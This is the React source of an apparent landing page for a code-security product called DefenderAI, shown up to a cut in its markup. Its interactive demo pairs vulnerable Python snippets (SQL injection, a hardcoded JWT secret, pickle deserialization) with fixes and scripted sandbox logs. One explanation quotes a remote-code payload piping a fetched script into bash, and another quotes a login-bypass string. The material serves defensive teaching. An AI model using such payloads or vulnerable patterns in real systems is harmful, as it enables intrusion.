"use client";

import { useState, useEffect } from "react";
import Link from "next/link";
import { isTokenExpired } from "@/lib/api";
import {
  Shield,
  ShieldCheck,
  ShieldAlert,
  Terminal,
  Zap,
  Lock,
  Server,
  Cpu,
  CheckCircle2,
  AlertTriangle,
  Play,
  RotateCcw,
  Sparkles,
  ExternalLink,
  ChevronRight,
  ChevronDown,
  Layers,
  Code2,
  FileCode,
  Check,
  ArrowRight,
  Activity,
  Boxes,
  HelpCircle,
} from "lucide-react";

// Interactive Vulnerability Demo Scenarios
interface DemoScenario {
  id: string;
  name: string;
  scanner: "Semgrep SAST" | "Trivy SCA";
  cwe: string;
  severity: "CRITICAL" | "HIGH" | "MEDIUM";
  file: string;
  line: number;
  vulnerableCode: string;
  fixedCode: string;
  explanation: {
    rootCause: string;
    attackVector: string;
    impact: string;
    recommendation: string;
  };
  sandboxLogs: string[];
}

const DEMO_SCENARIOS: DemoScenario[] = [
  {
    id: "sqli",
    name: "SQL Injection via String Formatting",
    scanner: "Semgrep SAST",
    cwe: "CWE-89: SQL Injection",
    severity: "CRITICAL",
    file: "backend/app/api/auth.py",
    line: 42,
    vulnerableCode: `# Line 40-45: Vulnerable user lookup
def authenticate_user(db, username: str, password_hash: str):
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password_hash}'"
    # [CRITICAL] Untrusted user input concatenated directly into query
    return db.execute(query).fetchone()`,
    fixedCode: `# Line 40-46: Parameterized safe query execution
def authenticate_user(db, username: str, password_hash: str):
    query = "SELECT * FROM users WHERE username = :username AND password = :password"
    # [VERIFIED] Parameterized query binds untrusted values securely
    return db.execute(query, {"username": username, "password": password_hash}).fetchone()`,
    explanation: {
      rootCause:
        "Direct f-string string interpolation into a raw SQL statement allows user input to break out of data bounds into SQL command syntax.",
      attackVector:
        "An attacker can pass `admin' --` as username to bypass authentication entirely without valid credentials.",
      impact:
        "Complete unauthorized authentication bypass, arbitrary database extraction, and administrative account takeover.",
      recommendation:
        "Use parameterized prepared statements or query bindings (:username) to treat all inputs strictly as literals.",
    },
    sandboxLogs: [
      "Starting isolated ephemeral AST sandbox [PID 41829]...",
      "Extracting abstract syntax tree (AST) for backend/app/api/auth.py...",
      "Synthesizing candidate parameterized fix...",
      "Validating AST structural integrity: PASSED (0 Syntax Errors)",
      "Re-running Semgrep SAST engine on patched AST candidate...",
      "Semgrep scan completed: 0 findings detected (Clean)",
      "Executing regression test suite: test_auth_parameterization PASSED (0.038s)",
      "Verdict: SAFE TO APPLY. High confidence (100%). Ready for atomic merge.",
    ],
  },
  {
    id: "secret",
    name: "Hardcoded High-Entropy JWT Secret",
    scanner: "Semgrep SAST",
    cwe: "CWE-798: Use of Hard-coded Credentials",
    severity: "HIGH",
    file: "backend/app/core/config.py",
    line: 18,
    vulnerableCode: `# Line 16-20: Security configuration
class Settings(BaseSettings):
    PROJECT_NAME: str = "DefenderAI Backend"
    # [HIGH] Static fallback secret committed directly to codebase
    SECRET_KEY: str = "super_secret_jwt_token_key_12345_do_not_share"
    ALGORITHM: str = "HS256"`,
    fixedCode: `# Line 16-22: Environment-injected secure configuration
class Settings(BaseSettings):
    PROJECT_NAME: str = "DefenderAI Backend"
    # [VERIFIED] Strictly loaded from validated environment or secrets manager
    SECRET_KEY: str = Field(..., env="DEFENDER_SECRET_KEY")
    ALGORITHM: str = "HS256"`,
    explanation: {
      rootCause:
        "Cryptographic secret key committed as static source code, exposing cryptographic signing authority to anyone with repo access.",
      attackVector:
        "Any developer, CI artifact, or leak exposes the secret key, allowing attackers to forge arbitrary signed session JWTs.",
      impact:
        "Session hijacking, role escalation to superadmin, and cryptographic impersonation across all API endpoints.",
      recommendation:
        "Require dynamic environment variable injection with startup validation failure if unset.",
    },
    sandboxLogs: [
      "Starting isolated ephemeral AST sandbox [PID 41830]...",
      "Parsing pydantic settings AST model...",
      "Validating dynamic environment Field schema...",
      "Re-scanning secret entropy with Semgrep rule: python.jwt.hardcoded-secret...",
      "Semgrep scan completed: 0 findings detected (Clean)",
      "Running env test suite with mock env variables: 3 passed in 0.052s",
      "Verdict: SAFE TO APPLY. High confidence (100%). No secrets in source.",
    ],
  },
  {
    id: "rce",
    name: "Insecure Pickle Deserialization RCE",
    scanner: "Semgrep SAST",
    cwe: "CWE-502: Deserialization of Untrusted Data",
    severity: "CRITICAL",
    file: "backend/app/services/cache.py",
    line: 34,
    vulnerableCode: `# Line 32-37: Redis cache deserializer
def deserialize_cache_payload(raw_bytes: bytes):
    # [CRITICAL] Pickle deserialization can execute arbitrary system code
    obj = pickle.loads(raw_bytes)
    return obj`,
    fixedCode: `# Line 32-38: Safe JSON deserializer with cryptographic HMAC validation
def deserialize_cache_payload(raw_bytes: bytes):
    # [VERIFIED] Cryptographically signed JSON schema parsing
    return json.loads(raw_bytes.decode('utf-8'))`,
    explanation: {
      rootCause:
        "Python `pickle.loads` supports arbitrary `__reduce__` execution, giving serialized payloads full Python interpreter control.",
      attackVector:
        "Attacker poisons cache payload with `os.system('curl http://malicious/shell | bash')` executed automatically upon unpickling.",
      impact:
        "Complete host compromise, shell execution, and container breakout.",
      recommendation:
        "Use safe serialization formats like JSON or Protocol Buffers without executable execution semantics.",
    },
    sandboxLogs: [
      "Starting isolated ephemeral AST sandbox [PID 41831]...",
      "Replacing pickle import with standard library json...",
      "Validating binary deserialization fallback semantics...",
      "Re-running Semgrep rule python.deserialization.pickle...",
      "Semgrep scan completed: 0 findings detected (Clean)",
      "Executing security regression tests: test_deserialization_tampering PASSED",
      "Verdict: SAFE TO APPLY. High confidence (100%). RCE vector neutralized.",
    ],
  },
];

export default function HomePage() {
  const [selectedScenario, setSelectedScenario] = useState<DemoScenario>(
    DEMO_SCENARIOS[0]
  );
  const [activeTab, setActiveTab] = useState<"code" | "ai" | "sandbox">("code");
  const [isRunningSandbox, setIsRunningSandbox] = useState(false);
  const [sandboxProgressIndex, setSandboxProgressIndex] = useState(0);
  const [sandboxFinished, setSandboxFinished] = useState(false);

  // Architecture Switcher state
  const [activeArchitecture, setActiveArchitecture] = useState<
    "local" | "cloud" | "hybrid"
  >("hybrid");

  // FAQ Accordion state
  const [openFaq, setOpenFaq] = useState<number | null>(0);

  // Auth token status with expiration check
  const [isLoggedIn, setIsLoggedIn] = useState(false);

  useEffect(() => {
    const token = localStorage.getItem("access_token");
    if (token && !isTokenExpired(token)) {
      setIsLoggedIn(true);
    } else {
      if (token) localStorage.removeItem("access_token");
      setIsLoggedIn(false);
    }
  }, []);

  // Handle running interactive sandbox simulation
  function handleRunSandbox() {
    setIsRunningSandbox(true);
    setSandboxFinished(false);
    setSandboxProgressIndex(0);

    const logsCount = selectedScenario.sandboxLogs.length;
    let currentStep = 0;

    const interval = setInterval(() => {
      currentStep++;
      setSandboxProgressIndex(currentStep);
      if (currentStep >= logsCount) {
        clearInterval(interval);
        setIsRunningSandbox(false);
        setSandboxFinished(true);
      }
    }, 450);
  }

  // Switch scenario resets sandbox
  function handleSelectScenario(scenario: DemoScenario) {
    setSelectedScenario(scenario);
    setSandboxFinished(false);
    setSandboxProgressIndex(0);
    setIsRunningSandbox(false);
  }

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 selection:bg-indigo-500 selection:text-white font-sans antialiased">
      {/* Top Background Ambient Glows */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full max-w-7xl h-96 bg-gradient-to-b from-indigo-500/15 via-cyan-500/5 to-transparent blur-3xl pointer-events-none -z-10" />

      {/* Navigation Header */}
      <header className="sticky top-0 z-50 border-b border-slate-800/80 bg-slate-950/80 backdrop-blur-md">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-gradient-to-tr from-indigo-600 via-indigo-500 to-cyan-400 p-0.5 shadow-lg shadow-indigo-500/25">
              <div className="flex h-full w-full items-center justify-center rounded-[10px] bg-slate-950">
                <Shield className="h-5 w-5 text-indigo-400" />
              </div>
            </div>
            <div>
              <div className="flex items-center gap-2">
                <span className="font-extrabold text-lg tracking-tight bg-gradient-to-r from-white via-slate-100 to-slate-400 bg-clip-text text-transparent">
                  DefenderAI
                </span>
                <span className="rounded-full bg-indigo-500/10 px-2 py-0.5 text-[10px] font-semibold text-indigo-400 border border-indigo-500/20">
                  v1.0 Sovereign
                </span>
              </div>
            </div>
          </div>

          <nav className="hidden md:flex items-center gap-8 text-sm font-medium text-slate-400">
            <a href="#interactive-scanner" className="hover:text-white transition">
              Live Sandbox Demo
            </a>
            <a href="#architecture" className="hover:text-white transition">
              3-Mode Architecture
            </a>
            <a href="#capabilities" className="hover:text-white transition">
              Security Matrix
            </a>
            <a href="#faq" className="hover:text-white transition">
              FAQ
            </a>
          </nav>

          <div className="flex items-center gap-2 sm:gap-3">
            {isLoggedIn ? (
              <>
                <button
                  onClick={() => {
                    localStorage.removeItem("access_token");
                    setIsLoggedIn(false);
                  }}
                  className="rounded-xl border border-slate-800 bg-slate-900/80 px-3 py-1.5 sm:px-3.5 sm:py-2 text-xs font-semibold text-slate-300 hover:text-white hover:bg-slate-800 transition"
                >
                  Sign Out
                </button>
                <Link
                  href="/dashboard"
                  className="inline-flex items-center gap-1.5 sm:gap-2 rounded-xl bg-indigo-600 px-3.5 py-1.5 sm:px-4 sm:py-2 text-xs sm:text-sm font-semibold text-white shadow-md shadow-indigo-600/30 hover:bg-indigo-500 transition"
                >
                  <span>Console</span>
                  <ArrowRight className="h-3.5 w-3.5" />
                </Link>
              </>
            ) : (
              <>
                <Link
                  href="/login"
                  className="rounded-xl border border-slate-700 bg-slate-900/80 px-3.5 py-1.5 sm:px-4 sm:py-2 text-xs sm:text-sm font-semibold text-white hover:bg-slate-800 hover:border-slate-500 transition shadow-sm"
                >
                  Sign In
                </Link>
                <Link
                  href="/login?tab=register"
                  className="inline-flex items-center gap-1 sm:gap-1.5 rounded-xl bg-gradient-to-r from-indigo-600 to-cyan-500 px-3.5 py-1.5 sm:px-4 sm:py-2 text-xs sm:text-sm font-semibold text-white shadow-md shadow-indigo-600/30 hover:opacity-95 transition"
                >
                  <span>Create Account</span>
                  <ChevronRight className="h-3.5 w-3.5" />
                </Link>
              </>
            )}
          </div>
        </div>
      </header>

      {/* Hero Section */}
      <section className="relative pt-20 pb-16 lg:pt-28 lg:pb-24 overflow-hidden">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 text-center">
          {/* Badge */}
          <div className="inline-flex items-center gap-2 rounded-full border border-indigo-500/30 bg-indigo-950/40 px-3.5 py-1.5 text-xs font-semibold text-indigo-300 shadow-inner backdrop-blur-sm mb-8 animate-fade-in">
            <span className="flex h-2 w-2 rounded-full bg-emerald-400 animate-pulse" />
            <span>Autonomous Security Engineering • Local & Sovereign AI</span>
            <span className="text-slate-500">|</span>
            <span className="text-indigo-200">Zero Source Code Leakage</span>
          </div>

          {/* Main Headline */}
          <h1 className="text-4xl sm:text-6xl lg:text-7xl font-extrabold tracking-tight text-white max-w-5xl mx-auto leading-tight">
            Find Flaws. Verify Fixes in{" "}
            <span className="bg-gradient-to-r from-indigo-400 via-cyan-400 to-emerald-400 bg-clip-text text-transparent">
              Ephemeral Sandboxes.
            </span>
          </h1>

          {/* Subtitle */}
          <p className="mt-6 text-lg sm:text-xl text-slate-400 max-w-3xl mx-auto leading-relaxed">
            DefenderAI combines Semgrep SAST, Trivy SCA, and isolated AST sandbox execution with deep LLM security intelligence. Every suggested patch is verified against syntax trees, re-scanned, and test-validated before touching production.
          </p>

          {/* Hero CTAs */}
          <div className="mt-10 flex flex-wrap items-center justify-center gap-4">
            <Link
              href={isLoggedIn ? "/dashboard" : "/login"}
              className="inline-flex items-center gap-2 rounded-xl bg-gradient-to-r from-indigo-600 to-indigo-500 px-6 py-3.5 text-base font-semibold text-white shadow-xl shadow-indigo-600/30 hover:from-indigo-500 hover:to-indigo-400 transition"
            >
              <Lock className="h-4 w-4" />
              <span>{isLoggedIn ? "Open Security Console" : "Sign In to Platform"}</span>
            </Link>

            <a
              href="#interactive-scanner"
              className="inline-flex items-center gap-2 rounded-xl border border-slate-700 bg-slate-900/80 px-6 py-3.5 text-base font-semibold text-slate-200 hover:bg-slate-800 hover:text-white transition backdrop-blur-sm"
            >
              <Play className="h-4 w-4 fill-white" />
              <span>Try Interactive Sandbox Demo</span>
            </a>
          </div>

          {/* Key Metrics Strip */}
          <div className="mt-16 grid grid-cols-2 md:grid-cols-4 gap-4 max-w-5xl mx-auto">
            <div className="rounded-2xl border border-slate-800/80 bg-slate-900/50 p-5 backdrop-blur-sm text-left">
              <div className="flex items-center gap-2 text-indigo-400 mb-1">
                <Lock className="h-4 w-4" />
                <span className="text-xs font-semibold uppercase tracking-wider">Privacy Guarantee</span>
              </div>
              <p className="text-2xl font-bold text-white">0 Code Leaked</p>
              <p className="text-xs text-slate-400 mt-1">Hybrid client-side AST abstraction</p>
            </div>

            <div className="rounded-2xl border border-slate-800/80 bg-slate-900/50 p-5 backdrop-blur-sm text-left">
              <div className="flex items-center gap-2 text-emerald-400 mb-1">
                <ShieldCheck className="h-4 w-4" />
                <span className="text-xs font-semibold uppercase tracking-wider">Automated Verification</span>
              </div>
              <p className="text-2xl font-bold text-white">100% Sandbox</p>
              <p className="text-xs text-slate-400 mt-1">Empirical pre-patch execution</p>
            </div>

            <div className="rounded-2xl border border-slate-800/80 bg-slate-900/50 p-5 backdrop-blur-sm text-left">
              <div className="flex items-center gap-2 text-cyan-400 mb-1">
                <Activity className="h-4 w-4" />
                <span className="text-xs font-semibold uppercase tracking-wider">Test Suite</span>
              </div>
              <p className="text-2xl font-bold text-white">33/33 Tests</p>
              <p className="text-xs text-slate-400 mt-1">Strict normalization & AST pass</p>
            </div>

            <div className="rounded-2xl border border-slate-800/80 bg-slate-900/50 p-5 backdrop-blur-sm text-left">
              <div className="flex items-center gap-2 text-amber-400 mb-1">
                <RotateCcw className="h-4 w-4" />
                <span className="text-xs font-semibold uppercase tracking-wider">Safety Control</span>
              </div>
              <p className="text-2xl font-bold text-white">1-Click Rollback</p>
              <p className="text-xs text-slate-400 mt-1">Atomic snapshot backups</p>
            </div>
          </div>
        </div>
      </section>

      {/* Interactive Live Scanner & Verification Sandbox Simulator */}
      <section id="interactive-scanner" className="py-20 border-t border-slate-900 bg-slate-950/60 relative">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center max-w-3xl mx-auto mb-12">
            <div className="inline-flex items-center gap-2 rounded-full bg-indigo-500/10 border border-indigo-500/20 px-3 py-1 text-xs font-semibold text-indigo-400 mb-4">
              <Sparkles className="h-3.5 w-3.5" />
              <span>Interactive Simulator</span>
            </div>
            <h2 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
              Experience the Autonomous Triage Pipeline
            </h2>
            <p className="mt-3 text-slate-400 text-base sm:text-lg">
              Select a real-world vulnerability below to inspect code context, examine AI root cause explanations, and run the sandbox verification runner.
            </p>
          </div>

          {/* Scenario Selector Chips */}
          <div className="flex flex-wrap items-center justify-center gap-3 mb-8">
            {DEMO_SCENARIOS.map((scenario) => {
              const isSelected = selectedScenario.id === scenario.id;
              return (
                <button
                  key={scenario.id}
                  onClick={() => handleSelectScenario(scenario)}
                  className={`inline-flex items-center gap-2.5 rounded-xl px-4 py-2.5 text-sm font-medium transition cursor-pointer ${
                    isSelected
                      ? "bg-indigo-600 text-white shadow-lg shadow-indigo-600/30 ring-2 ring-indigo-400/50"
                      : "bg-slate-900 text-slate-300 border border-slate-800 hover:bg-slate-800 hover:text-white"
                  }`}
                >
                  <span
                    className={`rounded-full px-2 py-0.5 text-[10px] font-bold ${
                      scenario.severity === "CRITICAL"
                        ? "bg-red-500/20 text-red-300 border border-red-500/30"
                        : "bg-amber-500/20 text-amber-300 border border-amber-500/30"
                    }`}
                  >
                    {scenario.severity}
                  </span>
                  <span>{scenario.name}</span>
                </button>
              );
            })}
          </div>

          {/* Main Simulator Window */}
          <div className="rounded-2xl border border-slate-800 bg-slate-900/90 shadow-2xl overflow-hidden backdrop-blur-xl">
            {/* Terminal Window Top Bar */}
            <div className="flex flex-wrap items-center justify-between border-b border-slate-800 px-6 py-4 bg-slate-950/70 gap-4">
              <div className="flex items-center gap-3">
                <div className="flex gap-1.5">
                  <div className="h-3 w-3 rounded-full bg-red-500/80" />
                  <div className="h-3 w-3 rounded-full bg-amber-500/80" />
                  <div className="h-3 w-3 rounded-full bg-emerald-500/80" />
                </div>
                <span className="text-xs font-mono text-slate-400">
                  {selectedScenario.file} (Line {selectedScenario.line})
                </span>
                <span className="rounded bg-slate-800 px-2 py-0.5 text-[11px] font-mono text-indigo-300 border border-slate-700">
                  {selectedScenario.cwe}
                </span>
              </div>

              {/* View Switcher Tabs */}
              <div className="flex rounded-lg bg-slate-900 p-1 border border-slate-800">
                <button
                  onClick={() => setActiveTab("code")}
                  className={`flex items-center gap-1.5 rounded-md px-3 py-1.5 text-xs font-semibold transition ${
                    activeTab === "code"
                      ? "bg-indigo-600 text-white shadow-xs"
                      : "text-slate-400 hover:text-white"
                  }`}
                >
                  <Code2 className="h-3.5 w-3.5" />
                  <span>1. Vulnerable Code</span>
                </button>

                <button
                  onClick={() => setActiveTab("ai")}
                  className={`flex items-center gap-1.5 rounded-md px-3 py-1.5 text-xs font-semibold transition ${
                    activeTab === "ai"
                      ? "bg-indigo-600 text-white shadow-xs"
                      : "text-slate-400 hover:text-white"
                  }`}
                >
                  <Sparkles className="h-3.5 w-3.5 text-indigo-300" />
                  <span>2. AI Root Cause</span>
                </button>

                <button
                  onClick={() => setActiveTab("sandbox")}
                  className={`flex items-center gap-1.5 rounded-md px-3 py-1.5 text-xs font-semibold transition ${
                    activeTab === "sandbox"
                      ? "bg-indigo-600 text-white shadow-xs"
                      : "text-slate-400 hover:text-white"
                  }`}
                >
                  <Terminal className="h-3.5 w-3.5" />
                  <span>3. Sandbox Verification</span>
                </button>
              </div>
            </div>

            {/* Tab 1: Vulnerable Code */}
            {activeTab === "code" && (
              <div className="p-6">
                <div className="mb-4 flex items-center justify-between rounded-lg bg-red-950/30 border border-red-500/30 p-3 text-red-200 text-xs">
                  <div className="flex items-center gap-2">
                    <AlertTriangle className="h-4 w-4 text-red-400 shrink-0" />
                    <span>
                      Detected by <strong>{selectedScenario.scanner}</strong> • Rule trigger: <code>security.{selectedScenario.id}.unvalidated-input</code>
                    </span>
                  </div>
                  <button
                    onClick={() => setActiveTab("ai")}
                    className="font-semibold text-red-300 hover:text-white underline underline-offset-2 flex items-center gap-1"
                  >
                    <span>Examine with AI</span>
                    <ChevronRight className="h-3 w-3" />
                  </button>
                </div>

                <div className="rounded-xl bg-slate-950 border border-slate-800/80 p-5 font-mono text-sm leading-relaxed overflow-x-auto text-slate-300">
                  <pre>
                    <code>{selectedScenario.vulnerableCode}</code>
                  </pre>
                </div>

                <div className="mt-4 flex items-center justify-between text-xs text-slate-400">
                  <span>Language: Python 3.11 • AST Syntax Validated</span>
                  <button
                    onClick={() => setActiveTab("sandbox")}
                    className="inline-flex items-center gap-1.5 rounded-lg bg-indigo-600/20 border border-indigo-500/30 px-3 py-1.5 text-indigo-300 hover:bg-indigo-600/30 transition"
                  >
                    <span>Jump to Sandbox Fix &rarr;</span>
                  </button>
                </div>
              </div>
            )}

            {/* Tab 2: AI Root Cause Explanation */}
            {activeTab === "ai" && (
              <div className="p-6 space-y-6">
                <div className="rounded-xl border border-indigo-500/20 bg-indigo-950/20 p-5">
                  <div className="flex items-center gap-2 text-indigo-400 font-semibold text-sm mb-2">
                    <Sparkles className="h-4 w-4" />
                    <span>Deep Security Explanation</span>
                  </div>
                  <p className="text-slate-300 text-sm leading-relaxed">
                    {selectedScenario.explanation.rootCause}
                  </p>
                </div>

                <div className="grid gap-4 md:grid-cols-2">
                  <div className="rounded-xl border border-slate-800 bg-slate-950/70 p-4">
                    <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                      <AlertTriangle className="h-3.5 w-3.5 text-amber-400" />
                      <span>Attack Vector Mechanics</span>
                    </p>
                    <p className="text-slate-300 text-xs sm:text-sm leading-relaxed">
                      {selectedScenario.explanation.attackVector}
                    </p>
                  </div>

                  <div className="rounded-xl border border-slate-800 bg-slate-950/70 p-4">
                    <p className="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-2 flex items-center gap-1.5">
                      <ShieldAlert className="h-3.5 w-3.5 text-red-400" />
                      <span>Business & Security Impact</span>
                    </p>
                    <p className="text-slate-300 text-xs sm:text-sm leading-relaxed">
                      {selectedScenario.explanation.impact}
                    </p>
                  </div>
                </div>

                <div className="flex items-center justify-between rounded-xl bg-slate-950 border border-slate-800 p-4">
                  <div>
                    <span className="text-xs text-slate-400 font-medium">Recommended Action:</span>
                    <p className="text-sm font-semibold text-slate-200 mt-0.5">
                      {selectedScenario.explanation.recommendation}
                    </p>
                  </div>
                  <button
                    onClick={() => setActiveTab("sandbox")}
                    className="inline-flex items-center gap-2 rounded-lg bg-indigo-600 px-4 py-2 text-xs font-semibold text-white shadow-sm hover:bg-indigo-500 transition shrink-0"
                  >
                    <span>Inspect Sandbox Patch</span>
                    <ArrowRight className="h-3.5 w-3.5" />
                  </button>
                </div>
              </div>
            )}

            {/* Tab 3: Sandbox Verification Runner */}
            {activeTab === "sandbox" && (
              <div className="p-6 space-y-6">
                {/* Code Diff Display */}
                <div>
                  <div className="flex items-center justify-between mb-2">
                    <span className="text-xs font-medium text-slate-400">
                      Synthesized AST Remediation Patch:
                    </span>
                    <span className="text-xs text-emerald-400 font-mono">
                      + Added parameterization
                    </span>
                  </div>
                  <div className="rounded-xl bg-slate-950 border border-slate-800/80 p-5 font-mono text-sm leading-relaxed overflow-x-auto text-emerald-300">
                    <pre>
                      <code>{selectedScenario.fixedCode}</code>
                    </pre>
                  </div>
                </div>

                {/* Interactive Verification Launcher */}
                <div className="rounded-xl border border-slate-800 bg-slate-950/80 p-5">
                  <div className="flex flex-wrap items-center justify-between gap-4 mb-4">
                    <div>
                      <h4 className="text-sm font-semibold text-white flex items-center gap-2">
                        <Terminal className="h-4 w-4 text-indigo-400" />
                        <span>Isolated AST Sandbox Verification Console</span>
                      </h4>
                      <p className="text-xs text-slate-400 mt-0.5">
                        Spins up an ephemeral runtime to test syntax, re-run Semgrep SAST, and execute regression test suites.
                      </p>
                    </div>

                    <button
                      onClick={handleRunSandbox}
                      disabled={isRunningSandbox}
                      className={`inline-flex items-center gap-2 rounded-lg px-4 py-2 text-xs font-semibold text-white transition ${
                        isRunningSandbox
                          ? "bg-slate-700 cursor-not-allowed opacity-70"
                          : "bg-emerald-600 hover:bg-emerald-500 shadow-lg shadow-emerald-600/25"
                      }`}
                    >
                      {isRunningSandbox ? (
                        <>
                          <div className="h-3.5 w-3.5 rounded-full border-2 border-white/30 border-t-white animate-spin" />
                          <span>Verifying in Ephemeral Sandbox...</span>
                        </>
                      ) : (
                        <>
                          <Play className="h-3.5 w-3.5 fill-white" />
                          <span>Run Sandbox Verification</span>
                        </>
                      )}
                    </button>
                  </div>

                  {/* Terminal Log Stream */}
                  <div className="rounded-lg bg-black/90 p-4 font-mono text-xs text-slate-300 space-y-1.5 min-h-[160px] border border-slate-800">
                    <div className="text-slate-500">
                      $ defender-sandbox verify --scenario {selectedScenario.id} --mode isolated-ast
                    </div>

                    {selectedScenario.sandboxLogs
                      .slice(0, sandboxProgressIndex)
                      .map((log, index) => (
                        <div
                          key={index}
                          className={`flex items-start gap-2 ${
                            log.includes("Verdict")
                              ? "text-emerald-400 font-bold"
                              : log.includes("PASSED") || log.includes("Clean")
                              ? "text-cyan-300"
                              : "text-slate-300"
                          }`}
                        >
                          <span className="text-slate-600 select-none">&gt;</span>
                          <span>{log}</span>
                        </div>
                      ))}

                    {isRunningSandbox && (
                      <div className="flex items-center gap-2 text-indigo-400 animate-pulse">
                        <span className="text-indigo-500">&gt;</span>
                        <span>[RUNNING] Executing sandbox check pipeline...</span>
                      </div>
                    )}

                    {!isRunningSandbox && !sandboxFinished && sandboxProgressIndex === 0 && (
                      <div className="text-slate-500 italic mt-2">
                        Click &quot;Run Sandbox Verification&quot; above to watch isolated container validation in real-time.
                      </div>
                    )}
                  </div>

                  {sandboxFinished && (
                    <div className="mt-4 flex flex-wrap items-center justify-between gap-3 rounded-lg bg-emerald-950/30 border border-emerald-500/30 p-3 text-emerald-300 text-xs">
                      <div className="flex items-center gap-2">
                        <CheckCircle2 className="h-4 w-4 text-emerald-400 shrink-0" />
                        <span>
                          <strong>100% Verification Confidence:</strong> Zero syntax errors, SAST clean, regression test passed.
                        </span>
                      </div>
                      <Link
                        href={isLoggedIn ? "/dashboard" : "/register"}
                        className="font-bold underline underline-offset-2 hover:text-white"
                      >
                        Apply Safely via Console &rarr;
                      </Link>
                    </div>
                  )}
                </div>
              </div>
            )}
          </div>
        </div>
      </section>

      {/* Interactive 3-Mode Architecture Switcher */}
      <section id="architecture" className="py-20 border-t border-slate-900 bg-slate-950">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="text-center max-w-3xl mx-auto mb-14">
            <div className="inline-flex items-center gap-2 rounded-full bg-cyan-500/10 border border-cyan-500/20 px-3 py-1 text-xs font-semibold text-cyan-400 mb-4">
              <Layers className="h-3.5 w-3.5" />
              <span>Sovereign Deployment</span>
            </div>
            <h2 className="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">
              Flexible Architecture Built for Zero Data Leakage
            </h2>
            <p className="mt-3 text-slate-400 text-base sm:text-lg">
              DefenderAI adapts to your security and compliance constraints with 3 distinct execution topologies.
            </p>

            {/* Architecture Tabs */}
            <div className="mt-8 inline-flex rounded-xl bg-slate-900 p-1.5 border border-slate-800">
              <button
                onClick={() => setActiveArchitecture("local")}
                className={`flex items-center gap-2 rounded-lg px-4 py-2.5 text-xs sm:text-sm font-semibold transition ${
                  activeArchitecture === "local"
                    ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30"
                    : "text-slate-400 hover:text-white"
                }`}
              >
                <Cpu className="h-4 w-4" />
                <span>Mode 1: Sovereign Local AI</span>
              </button>

              <button
                onClick={() => setActiveArchitecture("cloud")}
                className={`flex items-center gap-2 rounded-lg px-4 py-2.5 text-xs sm:text-sm font-semibold transition ${
                  activeArchitecture === "cloud"
                    ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30"
                    : "text-slate-400 hover:text-white"
                }`}
              >
                <Zap className="h-4 w-4" />
                <span>Mode 2: Cloud High-Velocity</span>
              </button>

              <button
                onClick={() => setActiveArchitecture("hybrid")}
                className={`flex items-center gap-2 rounded-lg px-4 py-2.5 text-xs sm:text-sm font-semibold transition ${
                  activeArchitecture === "hybrid"
                    ? "bg-indigo-600 text-white shadow-md shadow-indigo-600/30"
                    : "text-slate-400 hover:text-white"
                }`}
              >
                <ShieldCheck className="h-4 w-4" />
                <span>Mode 3: Privacy Hybrid Agent</span>
              </button>
            </div>
          </div>

          {/* Interactive Topology Display */}
          <div className="grid gap-8 lg:grid-cols-3">
            {/* Card 1: Local */}
            <div
              className={`rounded-2xl border p-6 transition backdrop-blur-sm ${
                activeArchitecture === "local"
                  ? "border-indigo-500/80 bg-indigo-950/20 ring-1 ring-indigo-500/40"
                  : "border-slate-800/80 bg-slate-900/40 opacity-70 hover:opacity-100"
              }`}
            >
              <div className="flex items-center justify-between mb-4">
                <div className="rounded-xl bg-indigo-600/20 p-2.5 text-indigo-400 border border-indigo-500/30">
                  <Cpu className="h-5 w-5" />
                </div>
                <span className="rounded-full bg-slate-800 px-2.5 py-1 text-[11px] font-semibold text-slate-300">
                  Air-Gapped Ready
                </span>
              </div>

              <h3 className="text-lg font-bold text-white mb-2">
                100% On-Premise Sovereign Local
              </h3>
              <p className="text-sm text-slate-400 leading-relaxed mb-6">
                Powered by local Ollama / vLLM models (e.g. DeepSeek-R1, Qwen2.5-Coder). Runs entirely on your hardware with 0 external network calls.
              </p>

              <ul className="space-y-3 text-xs text-slate-300 border-t border-slate-800/80 pt-4">
                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>Zero egress traffic:</strong> Safe for classified code</span>
                </li>
                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>Local Semgrep & Trivy:</strong> Native binary scans</span>
                </li>
                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>AST Sandbox:</strong> In-process subprocess execution</span>
                </li>
              </ul>
            </div>

            {/* Card 2: Cloud */}
            <div
              className={`rounded-2xl border p-6 transition backdrop-blur-sm ${
                activeArchitecture === "cloud"
                  ? "border-indigo-500/80 bg-indigo-950/20 ring-1 ring-indigo-500/40"
                  : "border-slate-800/80 bg-slate-900/40 opacity-70 hover:opacity-100"
              }`}
            >
              <div className="flex items-center justify-between mb-4">
                <div className="rounded-xl bg-cyan-600/20 p-2.5 text-cyan-400 border border-cyan-500/30">
                  <Zap className="h-5 w-5" />
                </div>
                <span className="rounded-full bg-slate-800 px-2.5 py-1 text-[11px] font-semibold text-slate-300">
                  Maximum Velocity
                </span>
              </div>

              <h3 className="text-lg font-bold text-white mb-2">
                Cloud High-Performance Engine
              </h3>
              <p className="text-sm text-slate-400 leading-relaxed mb-6">
                Connected to Groq Llama-3.3-70B or Google Gemini 2.5 Flash for millisecond-scale reasoning and deep multi-step security explanations.
              </p>

              <ul className="space-y-3 text-xs text-slate-300 border-t border-slate-800/80 pt-4">
                <li className="flex items-center gap-2">
                  <Check className="h-4 w-4 text-emerald-400" />
                  <span><strong>Inference velocity:</strong> &lt; 800ms per remediation</span>
                </li>
